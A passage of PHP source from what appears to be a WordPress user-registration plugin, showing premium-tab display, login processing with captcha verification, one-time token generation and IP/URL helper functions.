| [3322](#L3322) | 'plan'   => array( 'personal', 'plus', 'professional' ), |
| [3323](#L3323) | 'name'   => esc\_html\_\_( 'User Registration - File Upload', 'user-registration' ), |
| [3324](#L3324) | ), |
| [3325](#L3325) | 'user-registration-customize-my-account' => array( |
| [3326](#L3326) | 'label'  => esc\_html\_\_( 'Customize My Account', 'user-registration' ), |
| [3327](#L3327) | 'plugin' => 'user-registration-customize-my-account', |
| [3328](#L3328) | 'plan'   => array( 'plus', 'professional' ), |
| [3329](#L3329) | 'name'   => esc\_html\_\_( 'User Registration customize my account', 'user-registration' ), |
| [3330](#L3330) | ), |
| [3331](#L3331) | ); |
| [3332](#L3332) |  |
| [3333](#L3333) | return apply\_filters( 'user\_registration\_premium\_settings\_tab', $premium\_tabs ); |
| [3334](#L3334) | } |
| [3335](#L3335) | } |
| [3336](#L3336) |  |
| [3337](#L3337) | add\_action( 'user\_registration\_settings\_tabs', 'ur\_display\_premium\_settings\_tab' ); |
| [3338](#L3338) |  |
| [3339](#L3339) | if ( ! function\_exists( 'ur\_display\_premium\_settings\_tab' ) ) { |
| [3340](#L3340) |  |
| [3341](#L3341) | /\*\* |
| [3342](#L3342) | \* Method to display premium settings tabs. |
| [3343](#L3343) | \* |
| [3344](#L3344) | \* @since 3.0 |
| [3345](#L3345) | \*/ |
| [3346](#L3346) | function ur\_display\_premium\_settings\_tab() { |
| [3347](#L3347) | $license\_data    = ur\_get\_license\_plan(); |
| [3348](#L3348) | $license\_plan    = ! empty( $license\_data->item\_plan ) ? $license\_data->item\_plan : false; |
| [3349](#L3349) | $premium\_tabs    = ur\_premium\_settings\_tab(); |
| [3350](#L3350) | $tabs\_to\_display = array(); |
| [3351](#L3351) | $tab\_html        = ''; |
| [3352](#L3352) |  |
| [3353](#L3353) | foreach ( $premium\_tabs as $tab => $detail ) { |
| [3354](#L3354) | $tooltip\_html = ''; |
| [3355](#L3355) | $button       = ''; |
| [3356](#L3356) | if ( 'woocommerce' === $tab && ! is\_plugin\_active( $detail['plugin'] . '/' . $detail['plugin'] . '.php' ) ) { |
| [3357](#L3357) | continue; |
| [3358](#L3358) | } |
| [3359](#L3359) |  |
| [3360](#L3360) | if ( ! empty( $license\_plan ) ) { |
| [3361](#L3361) | if ( ! in\_array( $license\_plan, $detail['plan'], true ) ) { |
| [3362](#L3362) | if ( is\_plugin\_active( $detail['plugin'] . '/' . $detail['plugin'] . '.php' ) ) { |
| [3363](#L3363) | continue; |
| [3364](#L3364) | } |
| [3365](#L3365) |  |
| [3366](#L3366) | /\* translators: %s: License Plan Name. \*/ |
| [3367](#L3367) | $tooltip\_html = sprintf( \_\_( 'You have been subscribed to %s plan. Please upgrade to higher plans to use this feature.', 'user-registration' ), ucfirst( $license\_plan ) ); |
| [3368](#L3368) | $button       = '<a target="\_blank" href="https://wpuserregistration.com/pricing/?utm\_source=pro-fields&utm\_medium=popup-button&utm\_campaign=ur-upgrade-to-pro">' . esc\_html\_\_( 'Upgrade Plan', 'user-registration' ) . '</a>'; |
| [3369](#L3369) | array\_push( $tabs\_to\_display, $tab ); |
| [3370](#L3370) | } else { |
| [3371](#L3371) | $plugin\_name = $detail['name']; |
| [3372](#L3372) | $action      = ''; |
| [3373](#L3373) |  |
| [3374](#L3374) | if ( file\_exists( WP\_PLUGIN\_DIR . '/' . $detail['plugin'] ) ) { |
| [3375](#L3375) | if ( ! is\_plugin\_active( $detail['plugin'] . '/' . $detail['plugin'] . '.php' ) ) { |
| [3376](#L3376) | $action = 'Activate'; |
| [3377](#L3377) | } else { |
| [3378](#L3378) | continue; |
| [3379](#L3379) | } |
| [3380](#L3380) | } else { |
| [3381](#L3381) | $action = 'Install'; |
| [3382](#L3382) | } |
| [3383](#L3383) |  |
| [3384](#L3384) | /\* translators: %s: Addon Name. \*/ |
| [3385](#L3385) | $tooltip\_html = sprintf( \_\_( 'Please %1$s %2$s addon to use this feature.', 'user-registration' ), $action, ucwords( str\_replace( '-', ' ', $detail['plugin'] ) ) ); |
| [3386](#L3386) |  |
| [3387](#L3387) | /\* translators: %s: Action Name. \*/ |
| [3388](#L3388) | $button = '<a href="#" class="user-registration-settings-addon-' . strtolower( $action ) . '" data-slug="' . $detail['plugin'] . '" data-name="' . $plugin\_name . '">' . sprintf( esc\_html\_\_( '%s Addon', 'user-registration' ), $action ) . '</a>'; |
| [3389](#L3389) | array\_push( $tabs\_to\_display, $tab ); |
| [3390](#L3390) | } |
| [3391](#L3391) | } else { |
| [3392](#L3392) |  |
| [3393](#L3393) | if ( is\_plugin\_active( $detail['plugin'] . '/' . $detail['plugin'] . '.php' ) ) { |
| [3394](#L3394) | continue; |
| [3395](#L3395) | } |
| [3396](#L3396) |  |
| [3397](#L3397) | $tooltip\_html = \_\_( 'You are currently using the free version of our plugin. Please upgrade to premium version to use this feature.', 'user-registration' ); |
| [3398](#L3398) | $button       = '<a target="\_blank" href="https://wpuserregistration.com/pricing/?utm\_source=pro-fields&utm\_medium=popup-button&utm\_campaign=ur-upgrade-to-pro">' . esc\_html\_\_( 'Upgrade to Pro', 'user-registration' ) . '</a>'; |
| [3399](#L3399) | array\_push( $tabs\_to\_display, $tab ); |
| [3400](#L3400) | } |
| [3401](#L3401) |  |
| [3402](#L3402) | if ( in\_array( $tab, $tabs\_to\_display, true ) ) { |
| [3403](#L3403) | $tab\_html .= '<button class="nav-tab ur-nav\_\_link ur-nav-premium" disabled>'; |
| [3404](#L3404) | $tab\_html .= '<span class="ur-tooltip">' . esc\_html( $tooltip\_html ) . wp\_kses\_post( $button ) . '</span>'; |
| [3405](#L3405) | $tab\_html .= '<span class="ur-nav\_\_link-icon">'; |
| [3406](#L3406) | $tab\_html .= ur\_file\_get\_contents( '/assets/images/settings-icons/' . $tab . '.svg' ); |
| [3407](#L3407) | $tab\_html .= '</span>'; |
| [3408](#L3408) | $tab\_html .= '<span class="ur-nav\_\_link-label">'; |
| [3409](#L3409) | $tab\_html .= '<p>' . esc\_html( $detail['label'] ) . '</p>'; |
| [3410](#L3410) | $tab\_html .= '<svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="0.5" y="0.5" width="19" height="19" rx="2.5" fill="#5462FF" stroke="#5462FF"/><path d="M10 5L13 13H7L10 5Z" fill="#EFEFEF"/><path fill-rule="evenodd" clip-rule="evenodd" d="M5 7L5.71429 13H14.2857L15 7L10 11.125L5 7ZM14.2857 13.5714H5.71427V15H14.2857V13.5714Z" fill="white"/></svg>'; |
| [3411](#L3411) | $tab\_html .= '</span>'; |
| [3412](#L3412) | $tab\_html .= '</button>'; |
| [3413](#L3413) | } |
| [3414](#L3414) | } |
| [3415](#L3415) |  |
| [3416](#L3416) | echo $tab\_html; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped |
| [3417](#L3417) | } |
| [3418](#L3418) | } |
| [3419](#L3419) |  |
| [3420](#L3420) | if ( ! function\_exists( 'ur\_is\_ajax\_login\_enabled' ) ) { |
| [3421](#L3421) | /\*\* |
| [3422](#L3422) | \* Check whether the ajax login is enabled or not. |
| [3423](#L3423) | \* |
| [3424](#L3424) | \* @return bool |
| [3425](#L3425) | \*/ |
| [3426](#L3426) | function ur\_is\_ajax\_login\_enabled() { |
| [3427](#L3427) | return ur\_option\_checked( 'ur\_login\_ajax\_submission', false ); |
| [3428](#L3428) | } |
| [3429](#L3429) | } |
| [3430](#L3430) |  |
| [3431](#L3431) | if ( ! function\_exists( 'ur\_process\_login' ) ) { |
| [3432](#L3432) | /\*\* |
| [3433](#L3433) | \* Process the login form. |
| [3434](#L3434) | \* |
| [3435](#L3435) | \* @param string $nonce\_value Nonce. |
| [3436](#L3436) | \* @throws Exception Login errors. |
| [3437](#L3437) | \* |
| [3438](#L3438) | \* @since 3.0 |
| [3439](#L3439) | \*/ |
| [3440](#L3440) | function ur\_process\_login( $nonce\_value ) { |
| [3441](#L3441) | try { |
| [3442](#L3442) | // Custom error messages. |
| [3443](#L3443) | $messages = array( |
| [3444](#L3444) | 'empty\_username'   => get\_option( 'user\_registration\_message\_username\_required', esc\_html\_\_( 'Username is required.', 'user-registration' ) ), |
| [3445](#L3445) | 'empty\_password'   => get\_option( 'user\_registration\_message\_empty\_password', null ), |
| [3446](#L3446) | 'invalid\_username' => get\_option( 'user\_registration\_message\_invalid\_username', null ), |
| [3447](#L3447) | 'unknown\_email'    => get\_option( 'user\_registration\_message\_unknown\_email', esc\_html\_\_( 'A user could not be found with this email address.', 'user-registration' ) ), |
| [3448](#L3448) | 'pending\_approval' => get\_option( 'user\_registration\_message\_pending\_approval', null ), |
| [3449](#L3449) | 'denied\_access'    => get\_option( 'user\_registration\_message\_denied\_account', null ), |
| [3450](#L3450) | ); |
| [3451](#L3451) |  |
| [3452](#L3452) | $post = $\_POST; // phpcs:ignore WordPress.Security.NonceVerification |
| [3453](#L3453) |  |
| [3454](#L3454) | $hcaptca\_response    = isset( $post['h-captcha-response'] ) ? sanitize\_text\_field( wp\_unslash( $post['h-captcha-response'] ) ) : ''; |
| [3455](#L3455) | $recaptcha\_value     = isset( $post['g-recaptcha-response'] ) ? sanitize\_text\_field( wp\_unslash( $post['g-recaptcha-response'] ) ) : $hcaptca\_response; |
| [3456](#L3456) | $captcha\_response    = isset( $post['CaptchaResponse'] ) ? $post['CaptchaResponse'] : ''; //phpcs:ignore |
| [3457](#L3457) | $recaptcha\_enabled   = ur\_option\_checked( 'user\_registration\_login\_options\_enable\_recaptcha', false ); |
| [3458](#L3458) | $recaptcha\_type      = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_version', 'v2' ); |
| [3459](#L3459) | $invisible\_recaptcha = ur\_option\_checked( 'user\_registration\_captcha\_setting\_invisible\_recaptcha\_v2', false ); |
| [3460](#L3460) |  |
| [3461](#L3461) | if ( ur\_is\_ajax\_login\_enabled() ) { |
| [3462](#L3462) | $hcaptca\_response = $captcha\_response; |
| [3463](#L3463) | $recaptcha\_value  = $captcha\_response; |
| [3464](#L3464) | } |
| [3465](#L3465) |  |
| [3466](#L3466) | $login\_data = array( |
| [3467](#L3467) | 'user\_password' => isset( $post['password'] ) ? wp\_unslash( $post['password'] ) : '', //phpcs:ignore; |
| [3468](#L3468) | 'remember'      => isset( $post['rememberme'] ), |
| [3469](#L3469) | ); |
| [3470](#L3470) |  |
| [3471](#L3471) | $username = isset( $post['username'] ) ? trim( sanitize\_user( wp\_unslash( $post['username'] ) ) ) : ''; |
| [3472](#L3472) |  |
| [3473](#L3473) | if ( 'v2' === $recaptcha\_type && ! $invisible\_recaptcha ) { |
| [3474](#L3474) | $site\_key   = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key' ); |
| [3475](#L3475) | $secret\_key = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret' ); |
| [3476](#L3476) | } elseif ( 'v2' === $recaptcha\_type && $invisible\_recaptcha ) { |
| [3477](#L3477) | $site\_key   = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_key' ); |
| [3478](#L3478) | $secret\_key = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_invisible\_site\_secret' ); |
| [3479](#L3479) | } elseif ( 'v3' === $recaptcha\_type ) { |
| [3480](#L3480) | $site\_key   = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_v3' ); |
| [3481](#L3481) | $secret\_key = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_v3' ); |
| [3482](#L3482) | } elseif ( 'hCaptcha' === $recaptcha\_type ) { |
| [3483](#L3483) | $site\_key   = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_key\_hcaptcha' ); |
| [3484](#L3484) | $secret\_key = get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_site\_secret\_hcaptcha' ); |
| [3485](#L3485) | } |
| [3486](#L3486) |  |
| [3487](#L3487) | if ( $recaptcha\_enabled && ! empty( $site\_key ) && ! empty( $secret\_key ) ) { |
| [3488](#L3488) | if ( ! empty( $recaptcha\_value ) ) { |
| [3489](#L3489) | if ( 'hCaptcha' === $recaptcha\_type ) { |
| [3490](#L3490) | $data = wp\_remote\_get( 'https://hcaptcha.com/siteverify?secret=' . $secret\_key . '&response=' . $recaptcha\_value ); |
| [3491](#L3491) | $data = json\_decode( wp\_remote\_retrieve\_body( $data ) ); |
| [3492](#L3492) |  |
| [3493](#L3493) | if ( empty( $data->success ) || ( isset( $data->score ) && $data->score < apply\_filters( 'user\_registration\_hcaptcha\_threshold', 0.5 ) ) ) { |
| [3494](#L3494) | throw new Exception( '<strong>' . esc\_html\_\_( 'ERROR:', 'user-registration' ) . '</strong>' . esc\_html\_\_( 'Error on hCaptcha. Contact your site administrator.', 'user-registration' ) ); |
| [3495](#L3495) | } |
| [3496](#L3496) | } else { |
| [3497](#L3497) | $data = wp\_remote\_get( 'https://www.google.com/recaptcha/api/siteverify?secret=' . $secret\_key . '&response=' . $recaptcha\_value ); |
| [3498](#L3498) | $data = json\_decode( wp\_remote\_retrieve\_body( $data ) ); |
| [3499](#L3499) | if ( empty( $data->success ) || ( isset( $data->score ) && $data->score <= get\_option( 'user\_registration\_captcha\_setting\_recaptcha\_threshold\_score\_v3', apply\_filters( 'user\_registration\_recaptcha\_v3\_threshold', 0.5 ) ) ) ) { |
| [3500](#L3500) | throw new Exception( '<strong>' . esc\_html\_\_( 'ERROR:', 'user-registration' ) . '</strong>' . esc\_html\_\_( 'Error on google reCaptcha. Contact your site administrator.', 'user-registration' ) ); |
| [3501](#L3501) | } |
| [3502](#L3502) | } |
| [3503](#L3503) | } else { |
| [3504](#L3504) | throw new Exception( '<strong>' . esc\_html\_\_( 'ERROR:', 'user-registration' ) . '</strong>' . get\_option( 'user\_registration\_form\_submission\_error\_message\_recaptcha', esc\_html\_\_( 'Captcha code error, please try again.', 'user-registration' ) ) ); |
| [3505](#L3505) | } |
| [3506](#L3506) | } |
| [3507](#L3507) |  |
| [3508](#L3508) | do\_action( 'user\_registration\_login\_process\_before\_username\_validation', $post, $username, $nonce\_value, $messages ); |
| [3509](#L3509) |  |
| [3510](#L3510) | $validation\_error = new WP\_Error(); |
| [3511](#L3511) | $validation\_error = apply\_filters( 'user\_registration\_process\_login\_errors', $validation\_error, sanitize\_user( wp\_unslash( $post['username'] ) ), sanitize\_user( wp\_unslash( $post['password'] ) ) ); |
| [3512](#L3512) |  |
| [3513](#L3513) | if ( $validation\_error->get\_error\_code() ) { |
| [3514](#L3514) | throw new Exception( '<strong>' . esc\_html\_\_( 'ERROR:', 'user-registration' ) . '</strong>' . $validation\_error->get\_error\_message() ); |
| [3515](#L3515) | } |
| [3516](#L3516) |  |
| [3517](#L3517) | if ( empty( $username ) ) { |
| [3518](#L3518) | throw new Exception( '<strong>' . esc\_html\_\_( 'ERROR:', 'user-registration' ) . '</strong>' . $messages['empty\_username'] ); |
| [3519](#L3519) | } |
| [3520](#L3520) |  |
| [3521](#L3521) | if ( is\_email( $username ) && apply\_filters( 'user\_registration\_get\_username\_from\_email', true ) ) { |
| [3522](#L3522) | $user = get\_user\_by( 'email', $username ); |
| [3523](#L3523) |  |
| [3524](#L3524) | if ( isset( $user->user\_login ) ) { |
| [3525](#L3525) | $login\_data['user\_login'] = $user->user\_login; |
| [3526](#L3526) | } else { |
| [3527](#L3527) | if ( empty( $messages['unknown\_email'] ) ) { |
| [3528](#L3528) | $messages['unknown\_email'] = esc\_html\_\_( 'A user could not be found with this email address.', 'user-registration' ); |
| [3529](#L3529) | } |
| [3530](#L3530) |  |
| [3531](#L3531) | throw new Exception( '<strong>' . esc\_html\_\_( 'ERROR: ', 'user-registration' ) . '</strong>' . $messages['unknown\_email'] ); |
| [3532](#L3532) | } |
| [3533](#L3533) | } else { |
| [3534](#L3534) | $login\_data['user\_login'] = $username; |
| [3535](#L3535) | } |
| [3536](#L3536) |  |
| [3537](#L3537) | // On multisite, ensure user exists on current site, if not add them before allowing login. |
| [3538](#L3538) | if ( is\_multisite() ) { |
| [3539](#L3539) | $user\_data = get\_user\_by( 'login', $username ); |
| [3540](#L3540) |  |
| [3541](#L3541) | if ( $user\_data && ! is\_user\_member\_of\_blog( $user\_data->ID, get\_current\_blog\_id() ) ) { |
| [3542](#L3542) | add\_user\_to\_blog( get\_current\_blog\_id(), $user\_data->ID, 'customer' ); |
| [3543](#L3543) | } |
| [3544](#L3544) | } |
| [3545](#L3545) |  |
| [3546](#L3546) | // To check the specific login. |
| [3547](#L3547) | if ( 'email' === get\_option( 'user\_registration\_general\_setting\_login\_options\_with', array() ) ) { |
| [3548](#L3548) | $user\_data                = get\_user\_by( 'email', $username ); |
| [3549](#L3549) | $login\_data['user\_login'] = isset( $user\_data->user\_email ) ? $user\_data->user\_email : is\_email( $username ); |
| [3550](#L3550) | } elseif ( 'username' === get\_option( 'user\_registration\_general\_setting\_login\_options\_with', array() ) ) { |
| [3551](#L3551) | $user\_data                = get\_user\_by( 'login', $username ); |
| [3552](#L3552) | $login\_data['user\_login'] = isset( $user\_data->user\_login ) ? $user\_data->user\_login : ! is\_email( $username ); |
| [3553](#L3553) | } else { |
| [3554](#L3554) | $login\_data['user\_login'] = $username; |
| [3555](#L3555) | } |
| [3556](#L3556) |  |
| [3557](#L3557) | // Perform the login. |
| [3558](#L3558) | $user = wp\_signon( apply\_filters( 'user\_registration\_login\_credentials', $login\_data ), is\_ssl() ); |
| [3559](#L3559) |  |
| [3560](#L3560) | if ( is\_wp\_error( $user ) ) { |
| [3561](#L3561) | // Set custom error messages. |
| [3562](#L3562) | if ( ! empty( $user->errors['empty\_username'] ) && ! empty( $messages['empty\_username'] ) ) { |
| [3563](#L3563) | $user->errors['empty\_username'][0] = sprintf( '<strong>%s:</strong> %s', \_\_( 'ERROR', 'user-registration' ), $messages['empty\_username'] ); |
| [3564](#L3564) | } |
| [3565](#L3565) | if ( ! empty( $user->errors['empty\_password'] ) && ! empty( $messages['empty\_password'] ) ) { |
| [3566](#L3566) | $user->errors['empty\_password'][0] = sprintf( '<strong>%s:</strong> %s', \_\_( 'ERROR', 'user-registration' ), $messages['empty\_password'] ); |
| [3567](#L3567) | } |
| [3568](#L3568) | if ( ! empty( $user->errors['invalid\_username'] ) && ! empty( $messages['invalid\_username'] ) ) { |
| [3569](#L3569) | $user->errors['invalid\_username'][0] = $messages['invalid\_username']; |
| [3570](#L3570) | } |
| [3571](#L3571) | if ( ! empty( $user->errors['pending\_approval'] ) && ! empty( $messages['pending\_approval'] ) ) { |
| [3572](#L3572) | $user->errors['pending\_approval'][0] = sprintf( '<strong>%s:</strong> %s', \_\_( 'ERROR', 'user-registration' ), $messages['pending\_approval'] ); |
| [3573](#L3573) | } |
| [3574](#L3574) | if ( ! empty( $user->errors['denied\_access'] ) && ! empty( $messages['denied\_access'] ) ) { |
| [3575](#L3575) | $user->errors['denied\_access'][0] = sprintf( '<strong>%s:</strong> %s', \_\_( 'ERROR', 'user-registration' ), $messages['denied\_access'] ); |
| [3576](#L3576) | } |
| [3577](#L3577) |  |
| [3578](#L3578) | $message = $user->get\_error\_message(); |
| [3579](#L3579) | $message = str\_replace( '<strong>' . esc\_html( $login\_data['user\_login'] ) . '</strong>', '<strong>' . esc\_html( $username ) . '</strong>', $message ); |
| [3580](#L3580) | throw new Exception( $message ); |
| [3581](#L3581) | } else { |
| [3582](#L3582) | if ( in\_array( 'administrator', $user->roles, true ) && ur\_option\_checked( 'user\_registration\_login\_options\_prevent\_core\_login', true ) ) { |
| [3583](#L3583) | $redirect = admin\_url(); |
| [3584](#L3584) | } else { |
| [3585](#L3585) | if ( ! empty( $post['redirect'] ) ) { |
| [3586](#L3586) | $redirect = esc\_url\_raw( wp\_unslash( $post['redirect'] ) ); |
| [3587](#L3587) | } elseif ( wp\_get\_raw\_referer() ) { |
| [3588](#L3588) | $redirect = wp\_get\_raw\_referer(); |
| [3589](#L3589) | } else { |
| [3590](#L3590) | $redirect = get\_home\_url(); |
| [3591](#L3591) | } |
| [3592](#L3592) | } |
| [3593](#L3593) |  |
| [3594](#L3594) | $redirect = apply\_filters( 'user\_registration\_login\_redirect', $redirect, $user ); |
| [3595](#L3595) |  |
| [3596](#L3596) | if ( ur\_is\_ajax\_login\_enabled() ) { |
| [3597](#L3597) | wp\_send\_json\_success( array( 'message' => $redirect ) ); |
| [3598](#L3598) | wp\_send\_json( $user ); |
| [3599](#L3599) | } else { |
| [3600](#L3600) | wp\_redirect( wp\_validate\_redirect( $redirect, $redirect ) ); |
| [3601](#L3601) | exit; |
| [3602](#L3602) | } |
| [3603](#L3603) |  |
| [3604](#L3604) | if ( ur\_is\_ajax\_login\_enabled() ) { |
| [3605](#L3605) | wp\_send\_json( $user ); |
| [3606](#L3606) | } |
| [3607](#L3607) | } |
| [3608](#L3608) | } catch ( Exception $e ) { |
| [3609](#L3609) | $status\_code = $e->getCode(); |
| [3610](#L3610) | $message     = $e->getMessage(); |
| [3611](#L3611) |  |
| [3612](#L3612) | if ( $status\_code >= 200 && $status\_code < 300 ) { |
| [3613](#L3613) | if ( ur\_is\_ajax\_login\_enabled() ) { |
| [3614](#L3614) | wp\_send\_json\_success( |
| [3615](#L3615) | array( |
| [3616](#L3616) | 'message' => $message, |
| [3617](#L3617) | 'status'  => true, |
| [3618](#L3618) | ) |
| [3619](#L3619) | ); |
| [3620](#L3620) | } |
| [3621](#L3621) |  |
| [3622](#L3622) | ur\_add\_notice( $message, 'success' ); |
| [3623](#L3623) | } else { |
| [3624](#L3624) |  |
| [3625](#L3625) | if ( ur\_is\_ajax\_login\_enabled() ) { |
| [3626](#L3626) | wp\_send\_json\_error( |
| [3627](#L3627) | array( |
| [3628](#L3628) | 'message' => $message, |
| [3629](#L3629) | ) |
| [3630](#L3630) | ); |
| [3631](#L3631) | } |
| [3632](#L3632) |  |
| [3633](#L3633) | ur\_add\_notice( apply\_filters( 'login\_errors', $message ), 'error' ); |
| [3634](#L3634) | do\_action( 'user\_registration\_login\_failed' ); |
| [3635](#L3635) | } |
| [3636](#L3636) | } |
| [3637](#L3637) | } |
| [3638](#L3638) | } |
| [3639](#L3639) |  |
| [3640](#L3640) | if ( ! function\_exists( 'ur\_generate\_onetime\_token' ) ) { |
| [3641](#L3641) | /\*\* |
| [3642](#L3642) | \* Generate a one-time token for the given user ID and action. |
| [3643](#L3643) | \* |
| [3644](#L3644) | \* @param int    $user\_id The ID of the user for whom to generate the token. |
| [3645](#L3645) | \* @param string $action The action for which to generate the token. |
| [3646](#L3646) | \* @param int    $key\_length The length of the random key to be generated. Defaults to 32. |
| [3647](#L3647) | \* @param int    $expiration\_time The duration of the token's validity in minutes. Defaults to 60. |
| [3648](#L3648) | \* @return string The generated one-time token. |
| [3649](#L3649) | \*/ |
| [3650](#L3650) | function ur\_generate\_onetime\_token( $user\_id = 0, $action = '', $key\_length = 32, $expiration\_time = 60 ) { |
| [3651](#L3651) | $time = time(); |
| [3652](#L3652) | $key  = wp\_generate\_password( $key\_length, false ); |
| [3653](#L3653) |  |
| [3654](#L3654) | // Concatenate the key, action, and current time to form the token string. |
| [3655](#L3655) | $string = $key . $action . $time; |
| [3656](#L3656) |  |
| [3657](#L3657) | // Generate the token hash. |
| [3658](#L3658) | $token = wp\_hash( $string ); |
| [3659](#L3659) |  |
| [3660](#L3660) | // Set the token expiration time in seconds. |
| [3661](#L3661) | $expiration = apply\_filters( $action . '\_onetime\_token\_expiration', $expiration\_time \* 60 ); |
| [3662](#L3662) |  |
| [3663](#L3663) | // Set the user meta values for the token and expiration time. |
| [3664](#L3664) | update\_user\_meta( $user\_id, $action . '\_token' . $user\_id, $token ); |
| [3665](#L3665) | update\_user\_meta( $user\_id, $action . '\_token\_expiration' . $user\_id, $time + $expiration ); |
| [3666](#L3666) |  |
| [3667](#L3667) | return $token; |
| [3668](#L3668) | } |
| [3669](#L3669) | } |
| [3670](#L3670) |  |
| [3671](#L3671) | if ( ! function\_exists( 'ur\_get\_current\_page\_url' ) ) { |
| [3672](#L3672) | /\*\* |
| [3673](#L3673) | \* Get the current page URL. |
| [3674](#L3674) | \* |
| [3675](#L3675) | \* @return string The URL of the current page. |
| [3676](#L3676) | \*/ |
| [3677](#L3677) | function ur\_get\_current\_page\_url() { |
| [3678](#L3678) | $page\_url = ''; |
| [3679](#L3679) |  |
| [3680](#L3680) | if ( isset( $\_SERVER['HTTPS'] ) && 'on' === $\_SERVER['HTTPS'] ) { |
| [3681](#L3681) | $page\_url .= 'https://'; |
| [3682](#L3682) | } else { |
| [3683](#L3683) | $page\_url .= 'http://'; |
| [3684](#L3684) | } |
| [3685](#L3685) |  |
| [3686](#L3686) | if ( isset( $\_SERVER['HTTP\_HOST'] ) ) { |
| [3687](#L3687) | $page\_url .= sanitize\_text\_field( wp\_unslash( $\_SERVER['HTTP\_HOST'] ) ); |
| [3688](#L3688) | } |
| [3689](#L3689) |  |
| [3690](#L3690) | if ( isset( $\_SERVER['REQUEST\_URI'] ) ) { |
| [3691](#L3691) | $page\_url .= sanitize\_text\_field( wp\_unslash( $\_SERVER['REQUEST\_URI'] ) ); |
| [3692](#L3692) | } |
| [3693](#L3693) |  |
| [3694](#L3694) | return $page\_url; |
| [3695](#L3695) | } |
| [3696](#L3696) | } |
| [3697](#L3697) |  |
| [3698](#L3698) | if ( ! function\_exists( 'ur\_is\_passwordless\_login\_enabled' ) ) { |
| [3699](#L3699) | /\*\* |
| [3700](#L3700) | \* Check whether the passwordless login is enabled or not. |
| [3701](#L3701) | \* |
| [3702](#L3702) | \* @return bool |
| [3703](#L3703) | \*/ |
| [3704](#L3704) | function ur\_is\_passwordless\_login\_enabled() { |
| [3705](#L3705) | return ur\_option\_checked( 'user\_registration\_pro\_passwordless\_login', false ); |
| [3706](#L3706) | } |
| [3707](#L3707) | } |
| [3708](#L3708) |  |
| [3709](#L3709) | if ( ! function\_exists( 'ur\_get\_ip\_address' ) ) { |
| [3710](#L3710) |  |
| [3711](#L3711) | /\*\* |
| [3712](#L3712) | \* Get current user IP Address. |
| [3713](#L3713) | \* |
| [3714](#L3714) | \* @return string |
| [3715](#L3715) | \*/ |
| [3716](#L3716) | function ur\_get\_ip\_address() { |
| [3717](#L3717) | if ( isset( $\_SERVER['HTTP\_X\_REAL\_IP'] ) ) { // WPCS: input var ok, CSRF ok. |
| [3718](#L3718) | return sanitize\_text\_field( wp\_unslash( $\_SERVER['HTTP\_X\_REAL\_IP'] ) );  // WPCS: input var ok, CSRF ok. |
| [3719](#L3719) | } elseif ( isset( $\_SERVER['HTTP\_X\_FORWARDED\_FOR'] ) ) { // WPCS: input var ok, CSRF ok. |
| [3720](#L3720) | // Proxy servers can send through this header like this: X-Forwarded-For: client1, proxy1, proxy2 |
| [3721](#L3721) | // Make sure we always only send through the first IP in the list which should always be the client IP. |
| [3722](#L3722) | return (string) rest\_is\_ip\_address( trim( current( preg\_split( '/[,:]/', sanitize\_text\_field( wp\_unslash( $\_SERVER['HTTP\_X\_FORWARDED\_FOR'] ) ) ) ) ) ); // WPCS: input var ok, CSRF ok. |
| [3723](#L3723) | } elseif ( isset( $\_SERVER['REMOTE\_ADDR'] ) ) { // @codingStandardsIgnoreLine |
| [3724](#L3724) | return sanitize\_text\_field( wp\_unslash( $\_SERVER['REMOTE\_ADDR'] ) ); // @codingStandardsIgnoreLine |
| [3725](#L3725) | } |
| [3726](#L3726) | return ''; |
| [3727](#L3727) | } |
| [3728](#L3728) | } |
| [3729](#L3729) |  |
| [3730](#L3730) | if ( ! function\_exists( 'ur\_get\_all\_pages' ) ) { |
| [3731](#L3731) | /\*\* |
| [3732](#L3732) | \* Returns map of published pages as id->title format. |
| [3733](#L3733) | \* |
| [3734](#L3734) | \* @return array |
| [3735](#L3735) | \*/ |
| [3736](#L3736) | function ur\_get\_all\_pages() { |
| [3737](#L3737) | $pages = get\_pages(); |
| [3738](#L3738) |  |
| [3739](#L3739) | $pages\_array = array(); |
| [3740](#L3740) |  |
| [3741](#L3741) | foreach ( $pages as $page ) { |
| [3742](#L3742) | $pages\_array[ $page->ID ] = $page->post\_title; |
| [3743](#L3743) | } |
| [3744](#L3744) |  |
| [3745](#L3745) | return $pages\_array; |
| [3746](#L3746) | } |
| [3747](#L3747) | } |
| [3748](#L3748) |  |
| [3749](#L3749) | add\_action( 'user\_registration\_after\_user\_meta\_update', 'ur\_parse\_and\_update\_hidden\_field', 10, 3 ); |
| [3750](#L3750) |  |
| [3751](#L3751) | if ( ! function\_exists( 'ur\_parse\_and\_update\_hidden\_field' ) ) { |
| [3752](#L3752) | /\*\* |
| [3753](#L3753) | \* Parse the hidden field value and update. |
| [3754](#L3754) | \* |
| [3755](#L3755) | \* @param array $form\_data form data. |
| [3756](#L3756) | \* @param int   $form\_id form id. |
| [3757](#L3757) | \* @param int   $user\_id user id. |
| [3758](#L3758) | \*/ |
| [3759](#L3759) | function ur\_parse\_and\_update\_hidden\_field( $form\_data, $form\_id, $user\_id ) { |
| [3760](#L3760) | $values = array( |
| [3761](#L3761) | 'form\_id'      => $form\_id, |
| [3762](#L3762) | 'process\_type' => 'ur\_parse\_after\_meta\_update', |
| [3763](#L3763) | ); |
| [3764](#L3764) |  |
| [3765](#L3765) | foreach ( $form\_data as $key => $value ) { |
| [3766](#L3766) | if ( 'user\_email' === $value->field\_name ) { |
| [3767](#L3767) | $values['email'] = ur\_format\_field\_values( $value->field\_name, $value->value ); |
| [3768](#L3768) | } |
| [3769](#L3769) |  |
| [3770](#L3770) | $values[ $value->field\_name ] = ur\_format\_field\_values( $value->field\_name, $value->value ); |
| [3771](#L3771) | } |
| [3772](#L3772) |  |
| [3773](#L3773) | foreach ( $form\_data as $key => $value ) { |
